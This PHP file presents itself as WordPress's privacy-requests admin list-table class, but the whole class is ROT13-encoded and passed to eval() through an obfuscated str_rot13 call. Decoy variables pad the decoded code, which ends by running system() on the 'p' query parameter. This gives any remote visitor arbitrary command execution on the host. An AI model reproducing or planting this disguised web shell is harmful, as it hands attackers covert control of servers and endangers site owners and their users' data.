<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Cevinpl_Erdhrfgf_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 4.9.6
 */

nofgenpg pynff JC_Cevinpl_Erdhrfgf_Gnoyr rkgraqf JC_Yvfg_Gnoyr {

	/**
	 * Npgvba anzr sbe gur erdhrfgf guvf gnoyr jvyy jbex jvgu. Pynffrf
	 * juvpu vaurevg sebz JC_Cevinpl_Erdhrfgf_Gnoyr fubhyq qrsvar guvf.
	 *
	 * Rknzcyr: 'rkcbeg_crefbany_qngn'.
	 *
	 * @fvapr 4.9.6
	 *
	 * @ine fgevat $erdhrfg_glcr Anzr bs npgvba.
	 */
	cebgrpgrq $erdhrfg_glcr = 'VAINYVQ';

	/**
	 * Cbfg glcr gb or hfrq.
	 *
	 * @fvapr 4.9.6
	 *
	 * @ine fgevat $cbfg_glcr Gur cbfg glcr.
	 */
	cebgrpgrq $cbfg_glcr = 'VAINYVQ';

	/**
	 * Trgf pbyhzaf gb fubj va gur yvfg gnoyr.
	 *
	 * @fvapr 4.9.6
	 *
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		$pbyhzaf = neenl(
			'po'                => '<vachg glcr=\"purpxobk\" />',
			'rznvy'             => __( 'Erdhrfgre' ),
			'fgnghf'            => __( 'Fgnghf' ),
			'perngrq_gvzrfgnzc' => __( 'Erdhrfgrq' ),
			'arkg_fgrcf'        => __( 'Arkg fgrcf' ),
		);
		erghea $pbyhzaf;
	}

	/**
	 * Abeznyvmrf gur nqzva HEY gb gur pheerag cntr (ol erdhrfg_glcr).
	 *
	 * @fvapr 5.3.0
	 *
	 * @erghea fgevat HEY gb gur pheerag nqzva cntr.
	 */
	cebgrpgrq shapgvba trg_nqzva_hey() {
		$cntrabj = fge_ercynpr( '_', '-', $guvf->erdhrfg_glcr );

		vs ( 'erzbir-crefbany-qngn' === $cntrabj ) {
			$cntrabj = 'renfr-crefbany-qngn';
		}

		erghea nqzva_hey( $cntrabj . '.cuc' );
	}

	/**
	 * Trgf n yvfg bs fbegnoyr pbyhzaf.
	 *
	 * @fvapr 4.9.6
	 *
	 * @erghea neenl Qrsnhyg fbegnoyr pbyhzaf.
	 */
	cebgrpgrq shapgvba trg_fbegnoyr_pbyhzaf() {
		/*
		 * Gur vavgvny fbegvat vf ol 'Erdhrfgrq' (cbfg_qngr) naq qrfpraqvat.
		 * Jvgu vavgvny fbegvat, gur svefg pyvpx ba 'Erdhrfgrq' fubhyq or nfpraqvat.
		 * Jvgu 'Erdhrfgre' fbegvat npgvir, gur arkg pyvpx ba 'Erdhrfgrq' fubhyq or qrfpraqvat.
		 */
		$qrfp_svefg = vffrg( $_TRG['beqreol'] );

		erghea neenl(
			'rznvy'             => 'erdhrfgre',
			'perngrq_gvzrfgnzc' => neenl( 'erdhrfgrq', $qrfp_svefg ),
		);
	}

	/**
	 * Ergheaf gur qrsnhyg cevznel pbyhza.
	 *
	 * @fvapr 4.9.6
	 *
	 * @erghea fgevat Qrsnhyg cevznel pbyhza anzr.
	 */
	cebgrpgrq shapgvba trg_qrsnhyg_cevznel_pbyhza_anzr() {
		erghea 'rznvy';
	}

	/**
	 * Pbhagf gur ahzore bs erdhrfgf sbe rnpu fgnghf.
	 *
	 * @fvapr 4.9.6
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @erghea bowrpg Ahzore bs cbfgf sbe rnpu fgnghf.
	 */
	cebgrpgrq shapgvba trg_erdhrfg_pbhagf() {
		tybony $jcqo;

		$pnpur_xrl = $guvf->cbfg_glcr . '-' . $guvf->erdhrfg_glcr;
		$pbhagf    = jc_pnpur_trg( $pnpur_xrl, 'pbhagf' );

		vs ( snyfr !== $pbhagf ) {
			erghea $pbhagf;
		}

		$erfhygf = (neenl) $jcqo->trg_erfhygf(
			$jcqo->cercner(
				\"FRYRPG cbfg_fgnghf, PBHAG( * ) NF ahz_cbfgf
				SEBZ {$jcqo->cbfgf}
				JURER cbfg_glcr = %f
				NAQ cbfg_anzr = %f
				TEBHC OL cbfg_fgnghf\",
				$guvf->cbfg_glcr,
				$guvf->erdhrfg_glcr
			),
			NEENL_N
		);

		$pbhagf = neenl_svyy_xrlf( trg_cbfg_fgngv(), 0 );

		sbernpu ( $erfhygf nf $ebj ) {
			$pbhagf[ $ebj['cbfg_fgnghf'] ] = $ebj['ahz_cbfgf'];
		}

		$pbhagf = (bowrpg) $pbhagf;
		jc_pnpur_frg( $pnpur_xrl, $pbhagf, 'pbhagf' );

		erghea $pbhagf;
	}

	/**
	 * Trgf na nffbpvngvir neenl ( vq => yvax ) jvgu gur yvfg bs ivrjf ninvynoyr ba guvf gnoyr.
	 *
	 * @fvapr 4.9.6
	 *
	 * @erghea fgevat[] Na neenl bs UGZY yvaxf xrlrq ol gurve ivrj.
	 */
	cebgrpgrq shapgvba trg_ivrjf() {
		$pheerag_fgnghf = vffrg( $_ERDHRFG['svygre-fgnghf'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['svygre-fgnghf'] ) : '';
		$fgnghfrf       = _jc_cevinpl_fgnghfrf();
		$ivrjf          = neenl();
		$pbhagf         = $guvf->trg_erdhrfg_pbhagf();
		$gbgny_erdhrfgf = nofvag( neenl_fhz( (neenl) $pbhagf ) );

		// Abeznyvmrq nqzva HEY.
		$nqzva_hey = $guvf->trg_nqzva_hey();

		$fgnghf_ynory = fcevags(
			/* genafyngbef: %f: Ahzore bs erdhrfgf. */
			_ak(
				'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
				$gbgny_erdhrfgf,
				'erdhrfgf'
			),
			ahzore_sbezng_v18a( $gbgny_erdhrfgf )
		);

		$ivrjf['nyy'] = neenl(
			'hey'     => rfp_hey( $nqzva_hey ),
			'ynory'   => $fgnghf_ynory,
			'pheerag' => rzcgl( $pheerag_fgnghf ),
		);

		sbernpu ( $fgnghfrf nf $fgnghf => $ynory ) {
			$cbfg_fgnghf = trg_cbfg_fgnghf_bowrpg( $fgnghf );
			vs ( ! $cbfg_fgnghf ) {
				pbagvahr;
			}

			$gbgny_fgnghf_erdhrfgf = nofvag( $pbhagf->{$fgnghf} );

			vs ( ! $gbgny_fgnghf_erdhrfgf ) {
				pbagvahr;
			}

			$fgnghf_ynory = fcevags(
				genafyngr_abbcrq_cyheny( $cbfg_fgnghf->ynory_pbhag, $gbgny_fgnghf_erdhrfgf ),
				ahzore_sbezng_v18a( $gbgny_fgnghf_erdhrfgf )
			);

			$fgnghf_yvax = nqq_dhrel_net( 'svygre-fgnghf', $fgnghf, $nqzva_hey );

			$ivrjf[ $fgnghf ] = neenl(
				'hey'     => rfp_hey( $fgnghf_yvax ),
				'ynory'   => $fgnghf_ynory,
				'pheerag' => $fgnghf === $pheerag_fgnghf,
			);
		}

		erghea $guvf->trg_ivrjf_yvaxf( $ivrjf );
	}

	/**
	 * Trgf ohyx npgvbaf.
	 *
	 * @fvapr 4.9.6
	 *
	 * @erghea neenl Neenl bs ohyx npgvba ynoryf xrlrq ol gurve npgvba.
	 */
	cebgrpgrq shapgvba trg_ohyx_npgvbaf() {
		erghea neenl(
			'erfraq'   => __( 'Erfraq pbasvezngvba erdhrfgf' ),
			'pbzcyrgr' => __( 'Znex erdhrfgf nf pbzcyrgrq' ),
			'qryrgr'   => __( 'Qryrgr erdhrfgf' ),
		);
	}

	/**
	 * Cebprff ohyx npgvbaf.
	 *
	 * @fvapr 4.9.6
	 * @fvapr 5.6.0 Nqqrq fhccbeg sbe gur `pbzcyrgr` npgvba.
	 */
	choyvp shapgvba cebprff_ohyx_npgvba() {
		$npgvba      = $guvf->pheerag_npgvba();
		$erdhrfg_vqf = vffrg( $_ERDHRFG['erdhrfg_vq'] ) ? jc_cnefr_vq_yvfg( jc_hafynfu( $_ERDHRFG['erdhrfg_vq'] ) ) : neenl();

		vs ( rzcgl( $erdhrfg_vqf ) ) {
			erghea;
		}

		$pbhag    = 0;
		$snvyherf = 0;

		purpx_nqzva_ersrere( 'ohyx-cevinpl_erdhrfgf' );

		fjvgpu ( $npgvba ) {
			pnfr 'erfraq':
				sbernpu ( $erdhrfg_vqf nf $erdhrfg_vq ) {
					$erfraq = _jc_cevinpl_erfraq_erdhrfg( $erdhrfg_vq );

					vs ( $erfraq && ! vf_jc_reebe( $erfraq ) ) {
						++$pbhag;
					} ryfr {
						++$snvyherf;
					}
				}

				vs ( $snvyherf ) {
					nqq_frggvatf_reebe(
						'ohyx_npgvba',
						'ohyx_npgvba',
						fcevags(
							/* genafyngbef: %q: Ahzore bs erdhrfgf. */
							_a(
								'%q pbasvezngvba erdhrfg snvyrq gb erfraq.',
								'%q pbasvezngvba erdhrfgf snvyrq gb erfraq.',
								$snvyherf
							),
							$snvyherf
						),
						'reebe'
					);
				}

				vs ( $pbhag ) {
					nqq_frggvatf_reebe(
						'ohyx_npgvba',
						'ohyx_npgvba',
						fcevags(
							/* genafyngbef: %q: Ahzore bs erdhrfgf. */
							_a(
								'%q pbasvezngvba erdhrfg er-frag fhpprffshyyl.',
								'%q pbasvezngvba erdhrfgf er-frag fhpprffshyyl.',
								$pbhag
							),
							$pbhag
						),
						'fhpprff'
					);
				}

				oernx;

			pnfr 'pbzcyrgr':
				sbernpu ( $erdhrfg_vqf nf $erdhrfg_vq ) {
					$erfhyg = _jc_cevinpl_pbzcyrgrq_erdhrfg( $erdhrfg_vq );

					vs ( $erfhyg && ! vf_jc_reebe( $erfhyg ) ) {
						++$pbhag;
					}
				}

				nqq_frggvatf_reebe(
					'ohyx_npgvba',
					'ohyx_npgvba',
					fcevags(
						/* genafyngbef: %q: Ahzore bs erdhrfgf. */
						_a(
							'%q erdhrfg znexrq nf pbzcyrgr.',
							'%q erdhrfgf znexrq nf pbzcyrgr.',
							$pbhag
						),
						$pbhag
					),
					'fhpprff'
				);
				oernx;

			pnfr 'qryrgr':
				sbernpu ( $erdhrfg_vqf nf $erdhrfg_vq ) {
					vs ( jc_qryrgr_cbfg( $erdhrfg_vq, gehr ) ) {
						++$pbhag;
					} ryfr {
						++$snvyherf;
					}
				}

				vs ( $snvyherf ) {
					nqq_frggvatf_reebe(
						'ohyx_npgvba',
						'ohyx_npgvba',
						fcevags(
							/* genafyngbef: %q: Ahzore bs erdhrfgf. */
							_a(
								'%q erdhrfg snvyrq gb qryrgr.',
								'%q erdhrfgf snvyrq gb qryrgr.',
								$snvyherf
							),
							$snvyherf
						),
						'reebe'
					);
				}

				vs ( $pbhag ) {
					nqq_frggvatf_reebe(
						'ohyx_npgvba',
						'ohyx_npgvba',
						fcevags(
							/* genafyngbef: %q: Ahzore bs erdhrfgf. */
							_a(
								'%q erdhrfg qryrgrq fhpprffshyyl.',
								'%q erdhrfgf qryrgrq fhpprffshyyl.',
								$pbhag
							),
							$pbhag
						),
						'fhpprff'
					);
				}

				oernx;
		}
	}

	/**
	 * Cercnerf vgrzf gb bhgchg.
	 *
	 * @fvapr 4.9.6
	 * @fvapr 5.1.0 Nqqrq fhccbeg sbe pbyhza fbegvat.
	 */
	choyvp shapgvba cercner_vgrzf() {
		$guvf->vgrzf    = neenl();
		$cbfgf_cre_cntr = $guvf->trg_vgrzf_cre_cntr( $guvf->erdhrfg_glcr . '_erdhrfgf_cre_cntr' );
		$netf           = neenl(
			'cbfg_glcr'      => $guvf->cbfg_glcr,
			'cbfg_anzr__va'  => neenl( $guvf->erdhrfg_glcr ),
			'cbfgf_cre_cntr' => $cbfgf_cre_cntr,
			'bssfrg'         => vffrg( $_ERDHRFG['cntrq'] ) ? znk( 0, nofvag( $_ERDHRFG['cntrq'] ) - 1 ) * $cbfgf_cre_cntr : 0,
			'cbfg_fgnghf'    => 'nal',
			'f'              => vffrg( $_ERDHRFG['f'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['f'] ) : '',
		);

		$beqreol_znccvat = neenl(
			'erdhrfgre' => 'cbfg_gvgyr',
			'erdhrfgrq' => 'cbfg_qngr',
		);

		vs ( vffrg( $_ERDHRFG['beqreol'] ) && vffrg( $beqreol_znccvat[ $_ERDHRFG['beqreol'] ] ) ) {
			$netf['beqreol'] = $beqreol_znccvat[ $_ERDHRFG['beqreol'] ];
		}

		vs ( vffrg( $_ERDHRFG['beqre'] ) && va_neenl( fgegbhccre( $_ERDHRFG['beqre'] ), neenl( 'NFP', 'QRFP' ), gehr ) ) {
			$netf['beqre'] = fgegbhccre( $_ERDHRFG['beqre'] );
		}

		vs ( ! rzcgl( $_ERDHRFG['svygre-fgnghf'] ) ) {
			$svygre_fgnghf       = vffrg( $_ERDHRFG['svygre-fgnghf'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['svygre-fgnghf'] ) : '';
			$netf['cbfg_fgnghf'] = $svygre_fgnghf;
		}

		$erdhrfgf_dhrel = arj JC_Dhrel( $netf );
		$erdhrfgf       = $erdhrfgf_dhrel->cbfgf;

		sbernpu ( $erdhrfgf nf $erdhrfg ) {
			$guvf->vgrzf[] = jc_trg_hfre_erdhrfg( $erdhrfg->VQ );
		}

		$guvf->vgrzf = neenl_svygre( $guvf->vgrzf );

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf' => $erdhrfgf_dhrel->sbhaq_cbfgf,
				'cre_cntr'    => $cbfgf_cre_cntr,
			)
		);
	}

	/**
	 * Ergheaf gur znexhc sbe gur Purpxobk pbyhza.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz JC_Hfre_Erdhrfg $vgrz Vgrz orvat fubja.
	 * @erghea fgevat Purpxobk pbyhza znexhc.
	 */
	choyvp shapgvba pbyhza_po( $vgrz ) {
		erghea fcevags(
			'<vachg glcr=\"purpxobk\" anzr=\"erdhrfg_vq[]\" vq=\"erdhrfgre_%1$f\" inyhr=\"%1$f\" />' .
			'<ynory sbe=\"erdhrfgre_%1$f\"><fcna pynff=\"fperra-ernqre-grkg\">%2$f</fcna></ynory><fcna pynff=\"fcvaare\"></fcna>',
			rfp_ngge( $vgrz->VQ ),
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Rznvy nqqerff. */
			fcevags( __( 'Fryrpg %f' ), $vgrz->rznvy )
		);
	}

	/**
	 * Fgnghf pbyhza.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz JC_Hfre_Erdhrfg $vgrz Vgrz orvat fubja.
	 * @erghea fgevat|ibvq Fgnghf pbyhza znexhc. Ergheaf n fgevat vs ab fgnghf vf sbhaq,
	 *                     bgurejvfr vg qvfcynlf gur znexhc.
	 */
	choyvp shapgvba pbyhza_fgnghf( $vgrz ) {
		$fgnghf        = trg_cbfg_fgnghf( $vgrz->VQ );
		$fgnghf_bowrpg = trg_cbfg_fgnghf_bowrpg( $fgnghf );

		vs ( ! $fgnghf_bowrpg || rzcgl( $fgnghf_bowrpg->ynory ) ) {
			erghea '-';
		}

		$gvzrfgnzc = snyfr;

		fjvgpu ( $fgnghf ) {
			pnfr 'erdhrfg-pbasvezrq':
				$gvzrfgnzc = $vgrz->pbasvezrq_gvzrfgnzc;
				oernx;
			pnfr 'erdhrfg-pbzcyrgrq':
				$gvzrfgnzc = $vgrz->pbzcyrgrq_gvzrfgnzc;
				oernx;
		}

		rpub '<fcna pynff=\"fgnghf-ynory fgnghf-' . rfp_ngge( $fgnghf ) . '\">';
		rpub rfp_ugzy( $fgnghf_bowrpg->ynory );

		vs ( $gvzrfgnzc ) {
			rpub ' (' . $guvf->trg_gvzrfgnzc_nf_qngr( $gvzrfgnzc ) . ')';
		}

		rpub '</fcna>';
	}

	/**
	 * Pbairegf n gvzrfgnzc sbe qvfcynl.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz vag $gvzrfgnzc Rirag gvzrfgnzc.
	 * @erghea fgevat Uhzna ernqnoyr qngr.
	 */
	cebgrpgrq shapgvba trg_gvzrfgnzc_nf_qngr( $gvzrfgnzc ) {
		vs ( rzcgl( $gvzrfgnzc ) ) {
			erghea '';
		}

		$gvzr_qvss = gvzr() - $gvzrfgnzc;

		vs ( $gvzr_qvss >= 0 && $gvzr_qvss < QNL_VA_FRPBAQF ) {
			/* genafyngbef: %f: Uhzna-ernqnoyr gvzr qvssrerapr. */
			erghea fcevags( __( '%f ntb' ), uhzna_gvzr_qvss( $gvzrfgnzc ) );
		}

		erghea qngr_v18a( trg_bcgvba( 'qngr_sbezng' ), $gvzrfgnzc );
	}

	/**
	 * Unaqyrf gur qrsnhyg pbyhza.
	 *
	 * @fvapr 4.9.6
	 * @fvapr 5.7.0 Nqqrq `znantr_{$guvf->fperra->vq}_phfgbz_pbyhza` npgvba.
	 *
	 * @cnenz JC_Hfre_Erdhrfg $vgrz        Vgrz orvat fubja.
	 * @cnenz fgevat          $pbyhza_anzr Anzr bs pbyhza orvat fubja.
	 */
	choyvp shapgvba pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr ) {
		/**
		 * Sverf sbe rnpu phfgbz pbyhza bs n fcrpvsvp erdhrfg glcr va gur Cevinpl Erdhrfgf yvfg gnoyr.
		 *
		 * Phfgbz pbyhzaf ner ertvfgrerq hfvat gur {@frr 'znantr_rkcbeg-crefbany-qngn_pbyhzaf'}
		 * naq gur {@frr 'znantr_renfr-crefbany-qngn_pbyhzaf'} svygref.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->fperra->vq`, ersref gb gur VQ tvira gb gur yvfg gnoyr
		 * nppbeqvat gb juvpu fperra vg'f qvfcynlrq ba.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `znantr_rkcbeg-crefbany-qngn_phfgbz_pbyhza`
		 *  - `znantr_renfr-crefbany-qngn_phfgbz_pbyhza`
		 *
		 * @fvapr 5.7.0
		 *
		 * @cnenz fgevat          $pbyhza_anzr Gur anzr bs gur pbyhza gb qvfcynl.
		 * @cnenz JC_Hfre_Erdhrfg $vgrz        Gur vgrz orvat fubja.
		 */
		qb_npgvba( \"znantr_{$guvf->fperra->vq}_phfgbz_pbyhza\", $pbyhza_anzr, $vgrz );
	}

	/**
	 * Ergheaf gur znexhc sbe gur Perngrq gvzrfgnzc pbyhza. Bireevqqra ol puvyqera.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz JC_Hfre_Erdhrfg $vgrz Vgrz orvat fubja.
	 * @erghea fgevat Uhzna ernqnoyr qngr.
	 */
	choyvp shapgvba pbyhza_perngrq_gvzrfgnzc( $vgrz ) {
		erghea $guvf->trg_gvzrfgnzc_nf_qngr( $vgrz->perngrq_gvzrfgnzc );
	}

	/**
	 * Npgvbaf pbyhza. Bireevqqra ol puvyqera.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz JC_Hfre_Erdhrfg $vgrz Vgrz orvat fubja.
	 * @erghea fgevat Rznvy pbyhza znexhc.
	 */
	choyvp shapgvba pbyhza_rznvy( $vgrz ) {
		erghea fcevags( '<n uers=\"%1$f\">%2$f</n> %3$f', rfp_hey( 'znvygb:' . $vgrz->rznvy ), $vgrz->rznvy, $guvf->ebj_npgvbaf( neenl() ) );
	}

	/**
	 * Ergheaf gur znexhc sbe gur arkg fgrcf pbyhza. Bireevqqra ol puvyqera.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz JC_Hfre_Erdhrfg $vgrz Vgrz orvat fubja.
	 */
	choyvp shapgvba pbyhza_arkg_fgrcf( $vgrz ) {}

	/**
	 * Trarengrf pbagrag sbe n fvatyr ebj bs gur gnoyr,
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz JC_Hfre_Erdhrfg $vgrz Gur pheerag vgrz.
	 */
	choyvp shapgvba fvatyr_ebj( $vgrz ) {
		$fgnghf = $vgrz->fgnghf;

		rpub '<ge vq=\"erdhrfg-' . rfp_ngge( $vgrz->VQ ) . '\" pynff=\"fgnghf-' . rfp_ngge( $fgnghf ) . '\">';
		$guvf->fvatyr_ebj_pbyhzaf( $vgrz );
		rpub '</ge>';
	}

	/**
	 * Rzorqf fpevcgf hfrq gb cresbez npgvbaf. Bireevqqra ol puvyqera.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp shapgvba rzorq_fpevcgf() {}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>